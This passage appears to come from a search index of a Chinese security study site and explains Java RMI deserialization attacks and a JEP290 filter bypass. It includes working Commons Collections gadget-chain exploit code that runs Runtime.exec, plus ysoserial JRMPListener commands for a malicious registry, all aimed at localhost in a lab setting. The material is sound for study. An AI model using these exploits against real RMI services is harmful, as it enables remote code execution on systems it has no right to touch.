{ String.class, Class[].class }, new Object[] { \"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] { String.class }, new Object[]{\"calc.exe\"})}); Map innermap = new HashMap(); Map outermap = LazyMap.decorate(innermap, chainedTransformer); Class clazz = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class); cons.setAccessible(true); //\u5999\u5904 InvocationHandler handler = (InvocationHandler) cons.newInstance(Override.class,outermap);//\u83b7\u5f97\u4e00\u4e2aAnnotationInvocationHandler\u5bf9\u8c61 Map Prox = (Map) Proxy.newProxyInstance(outermap.getClass().getClassLoader(), outermap.getClass().getInterfaces(),handler);//\u521b\u5efa\u4e00\u4e2aMap\u7684\u4ee3\u7406\u7c7b\uff0c\u5176\u4ee3\u7406\u65b9\u6cd5\u4e3aAnnotationInvocationHandler\u5bf9\u8c61\u91cc\u7684invoke\u65b9\u6cd5 InvocationHandler handler1 = (InvocationHandler) cons.newInstance(Override.class,Prox); user.exp(handler1); }catch(Exception e){ e.printStackTrace(); } } }","title":"\u5ba2\u6237\u7aef\u653b\u51fb\u670d\u52a1\u7aef"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/RMI%20ATTACK/RMI%20ATTACK/#_6","text":"\u5728\u5ba2\u6237\u7aef\u5411\u6ce8\u518c\u7aef\u53d1\u9001\u67e5\u8be2\u8bf7\u6c42\u65f6\uff0c\u4f1a\u4f7f\u7528\u5230lookup\u51fd\u6570\u3002 \u6211\u4eec\u5bf9lookup\u51fd\u6570\u8fdb\u884c\u52a8\u6001\u8c03\u8bd5\u8ddf\u8fdb\uff0c\u4f1a\u6765\u5230\u8fd9\u4e2a\u5730\u65b9\u3002 \u53ef\u4ee5\u6e05\u6670\u5730\u53d1\u73b0\u5b58\u5728\u4e00\u4e2a\u5e8f\u5217\u5316\u65b9\u6cd5writeObject\uff0c\u5176\u4e2dvar1\u4fbf\u662flookup\u65b9\u6cd5\u4e2d\u4f20\u5165\u7684\u5b57\u7b26\u4e32\u3002var1\u5728\u8fdb\u884c\u5e8f\u5217\u5316\u540e\u4f1a\u5728\u540e\u9762\u7684ref.invoke(var2)\u5904\u53d1\u9001\u7ed9\u670d\u52a1\u7aef\uff0c\u670d\u52a1\u7aef\u4f1a\u53cd\u5e8f\u5217\u5316\u8fd9\u6bb5\u6570\u636e\uff0c\u7ed9\u4e86\u53cd\u5e8f\u5217\u5316\u653b\u51fb\u4ea7\u751f\u7684\u673a\u4f1a\uff1a\u6211\u4eec\u53ef\u4ee5\u4eff\u5199\u4e00\u4e2alookup\u65b9\u6cd5\uff0c\u7ed9var1\u8d4b\u503c\u4e3a\u6076\u610f\u6570\u636e\u53d1\u9001\u7ed9\u670d\u52a1\u7aef\uff0c\u9020\u6210\u653b\u51fb\u3002 \u4e0b\u9762\u8fd9\u6bb5\u4ee3\u7801\u662f\u6211\u5728\u5148\u77e5\u4e0a\u5ad6\u7684\u3002 https://xz.aliyun.com/t/8706#toc-9 import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import sun.rmi.server.UnicastRef; import java.io.ObjectOutput; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.rmi.Remote; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; import java.rmi.server.Operation; import java.rmi.server.RemoteCall; import java.rmi.server.RemoteObject; import java.util.HashMap; import java.util.Map; public class client { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class}, new Object[] {\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[] {Object.class, Object[].class}, new Object[] {null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] {String.class}, new Object[] {\"calc\"}) }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); innerMap.put(\"value\", \"Threezh1\"); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); Class AnnotationInvocationHandlerClass = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor cons = AnnotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class); cons.setAccessible(true); InvocationHandler evalObject = (InvocationHandler) cons.newInstance(java.lang.annotation.Retention.class, outerMap); Remote proxyEvalObject = Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[] { Remote.class }, evalObject)); Registry registry_remote = LocateRegistry.getRegistry(\"127.0.0.1\", 23335); // \u83b7\u53d6super.ref Field[] fields_0 = registry_remote.getClass().getSuperclass().getSuperclass().getDeclaredFields(); fields_0[0].setAccessible(true); UnicastRef ref = (UnicastRef) fields_0[0].get(registry_remote); // \u83b7\u53d6operations Field[] fields_1 = registry_remote.getClass().getDeclaredFields(); fields_1[0].setAccessible(true); Operation[] operations = (Operation[]) fields_1[0].get(registry_remote); // \u8ddflookup\u65b9\u6cd5\u4e00\u6837\u7684\u4f20\u503c\u8fc7\u7a0b RemoteCall var2 = ref.newCall((RemoteObject) registry_remote, operations, 2, 4905912898345647071L); ObjectOutput var3 = var2.getOutputStream(); var3.writeObject(proxyEvalObject); ref.invoke(var2); registry_remote.lookup(\"HelloRegistry\"); System.out.println(\"rmi start at 3333\"); } }","title":"\u5ba2\u6237\u7aef\u653b\u51fb\u6ce8\u518c\u7aef"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/RMI%20ATTACK/RMI%20ATTACK/#_7","text":"\u5ba2\u6237\u7aef\u5411\u6ce8\u518c\u7aef\u8c03\u7528list\uff0clookup\u7b49\u51fd\u6570\u67e5\u8be2\u670d\u52a1\u540e\uff0c\u6ce8\u518c\u7aef\u4f1a\u8fd4\u56de\u67e5\u8be2\u7ed3\u679c\u7684\u5e8f\u5217\u5316\u5f62\u5f0f\u7ed9\u5ba2\u6237\u7aef\uff0c\u5ba2\u6237\u7aef\u6536\u5230\u540e\u4f1a\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u64cd\u4f5c\uff0c\u8fd9\u5c31\u5b58\u5728\u53cd\u5e8f\u5217\u5316\u653b\u51fb\u7684\u53ef\u80fd\uff0c public class client { public static void main(String[] args){ try{ String url = \"rmi://127.0.0.1:23335/exp\"; user user = (user)Naming.lookup(url); }catch(Exception e){ e.printStackTrace(); } } } ysoserial\u5f00\u542f\u6076\u610f\u6ce8\u518c\u7aef java -cp .\\ysoserial-master-d367e379d9-1.jar ysoserial.exploit.JRMPListener 23335 CommonsCollections1 \"calc\"","title":"\u6ce8\u518c\u7aef\u653b\u51fb\u5ba2\u6237\u7aef"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/RMI%20ATTACK/RMI%20ATTACK/#jep290","text":"\u5728JDK8u121\uff0cJDK7u13\uff0cJDK6u141\u4e4b\u540e\u6dfb\u52a0\u4e86\u4e00\u4e2a\u65b0\u7684\u5b89\u5168\u673a\u5236JEP-290 \u5728JDK8u121\uff0cJDK7u13\uff0cJDK6u141\u4e4b\u540e\u6dfb\u52a0\u4e86\u4e00\u4e2a\u65b0\u7684\u5b89\u5168\u673a\u5236JEP-290\uff0c\u5b83\u63d0\u4f9b\u4e86\u4e00\u4e2a\u63a5\u53e3 ObjectInputFilter \uff0c\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2a\u63a5\u53e3\u6765\u5b9e\u73b0\u53cd\u5e8f\u5217\u5316\u65f6\u4f9d\u7167\u767d\u540d\u5355\u5b9e\u73b0\u7c7b\u7684\u8fc7\u6ee4\u3002 RMI\u8fc7\u7a0b\u4e2d\u9ed8\u8ba4\u6709\u8fc7\u6ee4\u5668\uff0c RegistryImpl#registryFilter \u53ef\u4ee5\u53d1\u73b0\u767d\u540d\u5355\u7c7b\u6709\u8fd9\u4e9b String / Number / Remote / Proxy / UnicastRef / RMIClientSocketFactory / RMIServerSocketFactory / ActivationID / UID \u53ea\u8981\u5728\u53cd\u5e8f\u5217\u5316\u8fc7\u7a0b\u4e2d\u51fa\u73b0\u7684\u7c7b\u4e0d\u662f\u4e0a\u8ff0\u7c7b\uff0c\u5c31\u4f1a\u629b\u51faREJECTED\u5f02\u5e38 \u4e0b\u9762\u662f\u6211\u57288u181 \u53d1\u8d77\u5ba2\u6237\u7aef\u653b\u51fb\u6ce8\u518c\u7aef\u65f6\u629b\u51fa\u7684REJECTED\u5f02\u5e38\u3002","title":"JEP290"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/RMI%20ATTACK/RMI%20ATTACK/#_8","text":"RMI\u7684\u8fc7\u6ee4\u5668\u662f\u5982\u4f55\u53d1\u6325\u4f5c\u7528\u7684\u5462\uff1f\u5e26\u7740\u8fd9\u4e2a\u7591\u95ee\uff0c\u6211\u4eec\u53bb\u8c03\u8bd5\u4e00\u4e0b\u4ee3\u7801\u3002 \u5047\u8bbe\u6b64\u65f6\u5ba2\u6237\u7aef\u4eff\u5199lookup\u65b9\u6cd5\u5411\u6ce8\u518c\u7aef\u53d1\u9001\u4e86\u4e00\u4e2a\u5bf9\u8c61\uff0c\u6216\u8005\u670d\u52a1\u7aef\u5411\u6ce8\u518c\u7aef\u53d1\u9001\u4e86\u4e00\u4e2abind/rebind\u8bf7\u6c42\uff0c\u6ce8\u518c\u7aef\u4fbf\u4f1a\u8c03\u7528UnicastServerRef\u6765\u5904\u7406\u8bf7\u6c42\u3002 \u8ddf\u8fdb\u8fd9\u4e2aUnicastServerRef#oldDispatch\u65b9\u6cd5\uff1a \u5728oldDispatch\u5012\u6570\u7b2c\u4e8c\u6392\u4ee3\u7801\uff0c\u8c03\u7528\u4e86UnicastServerRef#unmarshalCustomCallData\u65b9\u6cd5\uff0c\u8ddf\u8fdb\u4e00\u4e0b \u53ef\u4ee5\u770b\u89c1\u8be5\u65b9\u6cd5\u4f7f\u7528\u4e86setObjectInputFilter\u65b9\u6cd5\uff0c\u800c\u8fd9\u4e2a\u65b9\u6cd5\u662f\u7528\u4f5c\u4e8e\u7ed9\u5e8f\u5217\u5316\u6570\u636e\u589e\u52a0\u8fc7\u6ee4\u5668\u7684 \u8fd9\u91cc\u4fbf\u662f\u4e3a\u5f53\u524d\u5e8f\u5217\u5316\u6d41\u589e\u52a0\u4e86UnicastServerRef.this.filter\u8fd9\u4e2a\u8fc7\u6ee4\u5668\u3002 \ud83d\udccc\u90a3\u4e48UnicastServerRef.this.filter\u8fd9\u4e2a\u503c\u53c8\u662f\u54ea\u91cc\u6765\u7684\u5462\uff1f \u7b54\u6848\u662f\u5728\u8c03\u7528getRegistry\u65f6UnicastServerRef\u4fbf\u88ab\u521d\u59cb\u5316\u4e86\uff0c\u5176filter\u503c\u4e5f\u88ab\u8fdb\u884c\u4e86\u8d4b\u503c(Naming.bind \u4f1a\u81ea\u52a8\u8c03\u7528 LocateRegistry.getRegistry)\u3002 \u5982\u4e0b\u56fe\u4fbf\u662f\u8ddf\u8fdbLocateRegistry.getRegistry\u65b9\u6cd5\u540e\u7684\u4ee3\u7801\uff0c\u6b64\u5904\u5b9e\u4f8b\u5316\u4e86\u4e00\u4e2aUnicastServerRef\u5bf9\u8c61\u3002 \u6240\u4ee5UnicastServerRef.this.filter\u7684\u503c\u4fbf\u662fRegistryImpl#registryFilter \u5728\u8c03\u7528unmarshalCustomCallData\u8bbe\u7f6e\u597d\u5f53\u524d\u5e8f\u5217\u5316\u6d41\u7684\u8fc7\u6ee4\u5668\u540e\uff0c\u7a0b\u5e8f\u518d\u5f00\u59cb\u8c03\u7528RegistryImpl_Skel#dispatch\u6765\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u64cd\u4f5c \u5728readObject\u65b9\u6cd5\u4e2d\u4f1a\u5224\u65ad\u5f53\u524d\u5e8f\u5217\u5316\u6d41\u662f\u5426\u914d\u7f6e\u6709\u8fc7\u6ee4\u5668\uff0c\u5982\u679c\u6709\u8fc7\u6ee4\u5668\u5c31\u5728\u4e0b\u9762\u7528checkInput\u5bf9\u5e8f\u5217\u5316\u6d41\u8fdb\u884c\u8fc7\u6ee4\u3002\u800ccheckInput\u5b9e\u8d28\u662f\u662f\u8c03\u7528\u5e8f\u5217\u5316\u6d41\u7684\u8fc7\u6ee4\u5668\u6765\u8fdb\u884c\u8fc7\u6ee4 \u4e0b\u56fe\u662f\u4ece\u53cd\u5e8f\u5217\u5316\u5230\u8fc7\u6ee4\u7684\u6808\u5e27\u3002","title":"\u4ee3\u7801\u5206\u6790"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/RMI%20ATTACK/RMI%20ATTACK/#jep290-bypass","text":"","title":"JEP290 BYPASS"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/RMI%20ATTACK/RMI%20ATTACK/#unicastrefjdk8u231","text":"RegistryImpl_stub\u8fc7\u6ee4\u4e2d\u7684\u767d\u540d\u5355\u7c7b\u4e2d\u6709UnicastRef \u7c7b\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u8fd9\u4e2a\u7c7b\u4e0a\u4e0b\u6587\u7ae0\u7ed5\u8fc7JEP290. \u8fd9\u91cc\u5148\u6765\u628a\u8be5\u653b\u51fb\u65b9\u6cd5\u7684\u5927\u81f4\u8f6e\u5ed3\u52fe\u52d2\u51fa\u6765\uff0c\u65b9\u4fbf\u9605\u8bfb\u4e0b\u9762\u7684\u5185\u5bb9\uff1a \u9996\u5148\u6211\u4eec\u5411\u6ce8\u518c\u7aef\u53d1\u9001\u4e00\u4e2a\u6076\u610f\u5bf9\u8c61 \u8be5\u5bf9\u8c61\u80fd\u5728\u88ab\u53cd\u5e8f\u5217\u5316\u65f6\u4e3b\u52a8\u5411\u4e00\u4e2a\u6076\u610f\u6ce8\u518c\u7aef\u53d1\u8d77\u901a\u8baf\u5e76\u53cd\u5e8f\u5217\u5316\u5176\u4f20\u9001\u8fc7\u6765\u7684\u5185\u5bb9\uff0c\u6b64\u8fc7\u7a0b\u7684\u53cd\u5e8f\u5217\u5316\u6ca1\u6709\u7ecf\u8fc7Filter\u68c0\u9a8c \u5b8c\u6210\u653b\u51fb \u6211\u6240\u8fdb\u884c\u8c03\u8bd5\u7684\u4ee3\u7801\u5982\u4e0b import java.rmi.Naming; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class server { public static void main(String[] args) throws Exception{ String url = \"rmi://127.0.0.1:1069/user\"; user user = new userImpl(); LocateRegistry.createRegistry(1069); Naming.bind(url,user); System.out.println(\"Server Running At\uff1a\" + url); System.out.println(1); } } \u5ba2\u6237\u7aef\u7684exp\u5982\u4e0b\uff0c\u6211\u4eec\u53ef\u4ee5\u8ddf\u7740exp\u4e2d\u7684\u5185\u5bb9\u62bd\u4e1d\u5265\u8327\u7684\u5206\u6790 ublic class client { public static void main(String[] args) throws RemoteException, IllegalAccessException, InvocationTargetException, InstantiationException, ClassNotFoundException, NoSuchMethodException, AlreadyBoundException { Registry reg = LocateRegistry.getRegistry(\"localhost\",1069); ObjID id = new ObjID(new Random().nextInt()); // RMI registry TCPEndpoint te = new TCPEndpoint(\"127.0.0.1\", 8888); UnicastRef ref = new UnicastRef(new LiveRef(id, te, false)); RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref); reg.bind(\"test12\",proxy); } }","title":"UnicastRef\uff08JDK&lt;=8u231\uff09"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/RMI%20ATTACK/RMI%20ATTACK/#liveref","text":"\u6211\u4eec\u5148\u6765\u770b\u770bLiveRef\uff0c\u8fd9\u5bf9\u8c61\u662fRMI\u901a\u8baf\u4e2d\u6bd4\u8f83\u6838\u5fc3\u7684\u90e8\u5206\uff0c\u5b83\u8bb0\u5f55\u4e86\u6ce8\u518c\u7aef\u7684\u5404\u79cd\u4fe1\u606f\u3002\u6211\u4eec\u901a\u8fc7\u4ee5\u4e0b\u5185\u5bb9\u6765\u770bLiveRef\u662f\u5982\u4f55\u5b9a\u4f4d\u6ce8\u518c\u7aef\u7684\uff0c\u4e3a\u6211\u4eec\u64b0\u5199EXP\u65f6\u901a\u8fc7LiveRef\u5b9a\u4f4d\u6076\u610f\u6ce8\u518c\u7aef\u505a\u94fa\u57ab\u3002 \u5728Naming.lookup \u6216\u8005 Naming.bind\u65b9\u6cd5\u4e2d\uff0c\u90fd\u4f1a\u5148\u901a\u8fc7getRegistry\u65b9\u6cd5\u83b7\u53d6\u6ce8\u518c\u7aef\u3002 \u800cgetRegistry\u8fd4\u56de\u7684\u5bf9\u8c61\u662f\u4e00\u4e2a\u5c01\u88c5\u4e86\u7684UnicastRef\u5bf9\u8c61\uff0cUnicastRef\u4e2d\u5c01\u88c5\u4e86LiveRef\u5bf9\u8c61\uff0c\u5b58\u50a8\u4e86\u6ce8\u518c\u7aef\u4fe1\u606f\u3002 \u6240\u4ee5\u5b9e\u9645\u4e0a\u6ce8\u518c\u7aef\u4fe1\u606f\u662f\u7531\u5c01\u88c5\u5728UnicastRef\u5bf9\u8c61\u4e2d\u7684LiveRef\u5bf9\u8c61\u6765\u5b58\u50a8\u7684\u3002 \u5728bind\u65b9\u6cd5\u6267\u884c\u65f6\uff0c\u4f1a\u5148\u901a\u8fc7UnicastRef.newcall\u5229\u7528LiveRef\u5b58\u50a8\u7684\u6ce8\u518c\u7aef\u4fe1\u606f\u53bb\u5b9a\u4f4d\u6ce8\u518c\u7aef \u90a3\u4e48LiveRef\u4e2d\u5b58\u50a8\u7684\u4fe1\u606f\uff08ep,id,islocal)\u662f\u4ece\u54ea\u6765\u7684\u5462\uff1f\u6211\u4eec\u5c31\u9700\u8981\u53bb\u770b\u770bUnicastRef\u662f\u5982\u4f55\u521d\u59cb\u5316LiveRef\u8fd9\u4e2a\u7c7b\u7684\u3002 \u4e8eUnicastRef#UnicastRef(LiveRef var1)\u4e0e\u670d\u52a1\u7aefbind\u5904\u4e0b\u65ad\u70b9\uff0c\u5f53\u65ad\u70b9\u5728bind\u5904\u505c\u4e0b\u65f6\u4f7f\u5176\u7ee7\u7eed\u8fd0\u884c\u5230UnicastRef#UnicastRef(LiveRef var1\u3002\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u5982\u4e0b\u6808\u5e27 \u5728LocateRegistry#getRegistry \u5904\u4f1a\u5b9e\u4f8b\u5316LiveRef\u5e76\u4f20\u5165\u53c2\u6570\uff0c\u7136\u540e\u7528\u6b64LiveRef\u5bf9\u8c61\u5b9e\u4f8b\u5316UnicastRef\u3002 \u6211\u4eec\u770b\u770b\u5b9e\u4f8b\u5316LiveRef\u65f6\u4f20\u5165\u7684\u524d\u4e24\u4e2a\u53c2\u6570\u3002 \u5148\u6765\u770bobjid\uff0c\u8fd9\u91cc\u7684ObjID\u3002REGISTRY_ID\u662f\u4e00\u4e2a\u56fa\u5b9a\u503c0 \u518d\u6765\u770b\u770bTCPEndpoint\uff0c\u4f20\u5165TCPEndpoint\u7684\u53c2\u6570\u5206\u522b\u662f\u4ecermi\u5730\u5740\u5b57\u7b26\u4e32\u4e2d\u8bfb\u53d6\u7684host\uff0cport\u4ee5\u53ca\u4e24\u4e2anull\u503c\uff08csf\u56fa\u5b9a\u4e3anull\uff09 \u5230\u8fd9\u91cc\u5c31\u660e\u767d\u4e86LiveRef\u662f\u5982\u4f55\u5b9a\u4f4d\u6ce8\u518c\u7aef\u7684\u4e86\u3002","title":"LiveRef"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/RMI%20ATTACK/RMI%20ATTACK/#remoteobjectinvocationhandler","text":"RemoteObjectInvocationHandler \u8fd9\u4e2a\u5bf9\u8c61\u662fRemote\u7684\u5b50\u7c7b\uff0c\u6240\u4ee5\u662f\u53ef\u4ee5\u901a\u8fc7RMI\u7684\u8fc7\u6ee4\u68c0\u6d4b\u7684\u3002 exp\u8fd0\u884c\u540e\uff0c\u5f53\u6ce8\u518c\u7aef\u53cd\u5e8f\u5217\u5316\u65f6\uff0c\u4f1a\u8c03\u7528RemoteObjectInvocationHandler\u7236\u7c7bRemoteObject\u7684readObject\u65b9\u6cd5\uff08\u56e0\u4e3aRemoteObjectInvocationHandler\u81ea\u8eab\u5e76\u65e0readObject\u65b9\u6cd5\uff09\uff0c\u5728RemoteObject\u7684readObject\u65b9\u6cd5\u672b\u884c\u6709\u4e00\u4e2aref.readExternal(in) \u8ddf\u8fdb\u8be5\u65b9\u6cd5 \u8c03\u7528\u4e86LiveRef\u7684\u9759\u6001\u65b9\u6cd5read\uff0c\u8ddf\u8fdb\u8be5\u65b9\u6cd5 \u53d1\u73b0\u8fd9\u4e2a\u65b9\u6cd5\u4f1a\u6839\u636e\u5e8f\u5217\u5316\u6d41\u4e2d\u7684\u5185\u5bb9\u8fd8\u539f\u51faLiveRef\u5bf9\u8c61\uff0c\u8fd8\u539f\u51fa\u7684LiveRef\u5bf9\u8c61\u4e2d\u8bb0\u5f55\u4e86\u6076\u610f\u6ce8\u518c\u7aef\u7684IP\u548c\u7aef\u53e3\u53f7\u7b49\u4fe1\u606f\u3002 \u7136\u540e\u518d\u7ecf\u8fc7\u4e00\u7cfb\u5217\u7684\u6d41\u7a0b\uff0c\u4f1a\u8c03\u7528\u5230DGCClient#registerRefs 56\u884c\u4ee5LiveRef\u4e2d\u8bb0\u5f55\u7684\u6076\u610f\u6ce8\u518c\u7aef\u5730\u5740\u4e3a\u53c2\u6570\uff0c\u8c03\u7528\u4e86DGCClient.EndpointEntry.lookup\uff0c\u8fd4\u56de\u4e86\u4e00\u4e2a\u5c01\u88c5\u4e86\u6076\u610f\u6ce8\u518c\u7aef\u5730\u5740\u7684DGCClient\u5bf9\u8c61\u3002 \u7136\u540e\u8c03\u7528\u4e86\u8be5DGCClient\u5bf9\u8c61\u7684registerRefs\u65b9\u6cd5\u3002\u8ddf\u8fdb \u518dDGCClient#registerRefs \u672b\u884c\u4f1a\u8c03\u7528\u4e00\u4e2amakeDirtyCall\u65b9\u6cd5\uff0c\u5176\u4e2dvar2\u5c01\u88c5\u4e86\u6307\u5411\u6076\u610f\u6ce8\u518c\u7aef\u7684LiveRef\u5bf9\u8c61\uff0c\u8ddf\u8fdb \u7136\u540e\u4f1a\u8c03\u7528\u4e00\u4e2athis.dgc.dirty\u65b9\u6cd5\uff0cthis.dgc\u4e2d\u5c01\u88c5\u4e86\u6307\u5411\u6076\u610f\u6ce8\u518c\u7aef\u7684LiveRef\uff0c\u8ddf\u8fdb \u6b64\u5904\u7684\u4ee3\u7801\uff08DGCImpl_stub#dirty\uff09\u5c31\u5f88\u50cf \u8be5\u65b9\u6cd5\u4f1a\u5148\u5411\u6076\u610f\u6ce8\u518c\u7aef\u5efa\u7acb\u901a\u8baf\uff0c\u53d1\u9001\u5e8f\u5217\u5316\u4fe1\u606f\uff0c\u63a5\u6536\u6ce8\u518c\u7aef\u4f20\u6765\u7684\u4fe1\u606f\u5e76\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u3002\u5728\u8be5readObject\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u65f6\u5e76\u6ca1\u6709\u8bbe\u7f6e\u8fc7\u6ee4\u5668\uff0c\u6240\u4ee5\u81ea\u7136\u800c\u7136\u5730\u4fbf\u7ed5\u8fc7\u4e86RMI\u901a\u8baf\u4e2dJEP290\u8bbe\u7f6e\u7684\u8fc7\u6ee4\u5668\u7684\u68c0\u6d4b\uff0c\u4ece\u800c\u53ef\u4ee5\u53cd\u5e8f\u5217\u5316\u4efb\u4f55\u6076\u610f\u6ce8\u518c\u7aef\u4f20\u6765\u7684\u5e8f\u5217\u5316\u6d41\uff0c\u9020\u6210\u53cd\u5e8f\u5217\u5316\u653b\u51fb\u3002","title":"RemoteObjectInvocationHandler&#x20;"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/RMI%20ATTACK/RMI%20ATTACK/#_9","text":"\u9996\u5148\u5f00\u542f\u6ce8\u518c\u7aef\uff0cuser\u7c7b\u7684\u5177\u4f53\u4ee3\u7801\u5c31\u4e0d\u8d34\u4e86\uff0c\u6ce8\u518c\u7aef\u7aef\u53e3\u4e3a1069 import java.rmi.Naming; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class server { public static void main(String[] args) throws Exception{ String url = \"rmi://127.0.0.1:1069/user\"; user user = new userImpl(); LocateRegistry.createRegistry(1069); Naming.bind(url,user); System.out.println(\"Server Running At\uff1a\" + url); System.out.println(1); } } \u5ba2\u6237\u7aef\u4ee3\u7801 import sun.rmi.server.UnicastRef; import sun.rmi.transport.LiveRef; import sun.rmi.transport.tcp.TCPEndpoint; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Proxy; import java.rmi.AlreadyBoundException; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; import java.rmi.server.ObjID; import java.rmi.server.RemoteObjectInvocationHandler; import java.util.Random; public class client { public static void main(String[] args) throws RemoteException, IllegalAccessException, InvocationTargetException, InstantiationException, ClassNotFoundException, NoSuchMethodException, AlreadyBoundException { Registry reg = LocateRegistry.getRegistry(\"localhost\",1069); ObjID id = new ObjID(new Random().nextInt()); // RMI registry TCPEndpoint te = new TCPEndpoint(\"127.0.0.1\", 8888); UnicastRef ref = new UnicastRef(new LiveRef(id, te, false)); RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref); reg.bind(\"test12\",obj); } } \u7136\u540eysoserial\u542f\u52a8\u6076\u610f\u6ce8\u518c\u7aef java -cp .\\ysoserial-master-d367e379d9-1.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections5 \"calc\" \u5ba2\u6237\u7aef\u8fd0\u884c\uff0c\u6210\u529f\u5f39\u51fa\u8ba1\u7b97\u5668","title":"\u5b8c\u6574\u590d\u73b0"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/RMI%20ATTACK/RMI%20ATTACK/#lookup","text":"\u9664\u4e86bind\uff0c\u4e5f\u53ef\u4ee5\u7528lookup\u7684\u4eff\u5199\u6765\u5b9e\u73b0\uff0c\u8fd9\u4e24\u8005\u4e4b\u95f4\u5e95\u5c42\u539f\u7406\u90fd\u662f\u4e00\u6837\u7684\u3002 import sun.rmi.server.UnicastRef; import sun.rmi.transport.LiveRef; import sun.rmi.transport.tcp.TCPEndpoint; import java.lang.reflect.Proxy; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; import java.rmi.server.*; import java.util.Random; import java.io.ObjectOutput; import java.lang.reflect.Field; public class client { public static void main(String[] args) throws Exception { Registry registry = LocateRegistry.getRegistry(\"localhost\",1069); ObjID id = new ObjID(new Random().nextInt()); // RMI registry TCPEndpoint te = new TCPEndpoint(\"localhost\", 8888); UnicastRef ref = new UnicastRef(new LiveRef(id, te, true)); RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref); //\u6a21\u4efflookup\u8bf7\u6c42 Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields(); fields_0[0].setAccessible(true); UnicastRef ref2 = (UnicastRef) fields_0[0].get(registry); Field[] fields_1 = registry.getClass().getDeclaredFields(); fields_1[0].setAccessible(true); Operation[] operations = (Operation[]) fields_1[0].get(registry); RemoteCall var2 = ref2.newCall((RemoteObject) registry, operations, 2, 4905912898345647071L); ObjectOutput var3 = var2.getOutputStream(); var3.writeObject(obj); ref2.invoke(var2); } }","title":"\u4eff\u5199lookup\u5b9e\u73b0"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/RMI%20ATTACK/RMI%20ATTACK/#_10","text":"\u6240\u4ee5\u672c\u8d28\u4e0a\u6b64\u7ed5\u8fc7\u65b9\u6cd5\u662f \u901a\u8fc7\u53cd\u5e8f\u5217\u5316\u8ba9\u6ce8\u518c\u7aef\u53d8\u4e3aJRMP\u5ba2\u6237\u7aef\uff0c\u5411\u6211\u4eec\u6076\u610f\u7684JRMP\u6ce8\u518c\u7aef\u53d1\u8d77 JRMP \u8bf7\u6c42\u3002 \u501f\u7528\u4e00\u4e0bttpfx\u5e08\u5085\u7684\u56fe\u590d\u76d8\u5168\u8fc7\u7a0b UnicastRef\u4e2d\u7684LiveRef\u88ab\u7528\u4f5c\u5b9a\u4f4d\u6ce8\u518c\u7aef\uff0c\u8fd9\u662f\u524d\u63d0\u3002 